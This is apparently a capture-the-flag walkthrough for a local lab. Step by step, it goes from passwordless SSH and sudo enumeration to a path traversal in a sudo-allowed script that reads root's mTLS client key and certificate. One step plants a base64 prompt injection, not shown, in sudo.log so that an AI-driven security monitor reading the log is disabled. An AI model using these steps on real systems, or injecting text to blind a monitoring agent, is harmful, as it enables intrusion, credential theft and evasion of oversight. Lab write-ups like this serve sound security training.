### Recon

`curl -vk https://localhost:8443`

The response indicate the website expects mTLS.

`ssh localhost`

The response contains a username ctfuser.

### Initial access

`ssh ctfuser@localhost`

No password needed.


### Enumaration

`ls`

Reveals `info.txt` containing the location of the mTLS credentials and that there is an agentic SOC.

### Privilege escelation

`sudo -l`

Reveals a script that ctfuser can run with elevated privilages.

`cat /usr/local/sbin/show-log`

There is a path traversal vulnerability in the script.


### Defence Impairment

´sudo echo BASE64-ENCODED-PROMPT-INJECTION=`

Will be logged in the sudo.log and then ingested by the agentic SOC.


### Credential Access

´sudo /usr/local/sbin/show-log ../../root/client.key`
´sudo /usr/local/sbin/show-log ../../root/client.crt`


### Discovery

Fuzzing tools such as ffuf can be used to find endpoints on the web site. This will lead to the discovery of /flag endpoint


### Impact

On attacker machine.

`curl -k https://localhost:8443/flag`

If the prompt injection was succesful the flag should be shown.
